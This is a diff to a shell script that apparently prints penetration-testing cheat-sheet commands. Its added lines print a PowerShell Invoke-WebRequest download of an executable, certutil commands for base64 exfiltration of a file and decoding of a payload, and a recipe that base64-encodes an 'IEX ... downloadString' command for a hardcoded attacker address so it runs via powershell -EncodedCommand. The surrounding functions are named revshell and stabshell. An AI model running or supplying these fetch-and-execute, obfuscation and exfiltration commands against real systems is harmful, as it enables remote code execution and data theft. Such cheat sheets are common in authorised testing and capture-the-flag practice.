@@ -56,6 +56,12 @@ function downloadfiles {
 
   echo "# Powershell get file" | lolcat
   echo "wget \"$url\" -outfile filename.exe"
+  echo "Invoke-WebRequest \"$url\" -outfile filename.exe"
+  echo ""
+
+  echo "# base64 xfer/exfil" | lolcat
+  echo "certutil -encode exfil_file.dat exfil.b64"
+  echo "certutil -decode payload.b64 payload.exe"
   echo ""
 }
 
@@ -83,6 +89,14 @@ function revshell {
   echo ""
 
   downloadfiles "http://$lhost:$lport/filename.exe"
+
+do_title_bar  "windows encoding"
+  echo "# Powershell encoded command (hacktricks)" | lolcat
+  cat << EOF
+kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
+PS> powershell -EncodedCommand <Base64>
+EOF
+  echo ""
 }
 
 function stabshell {
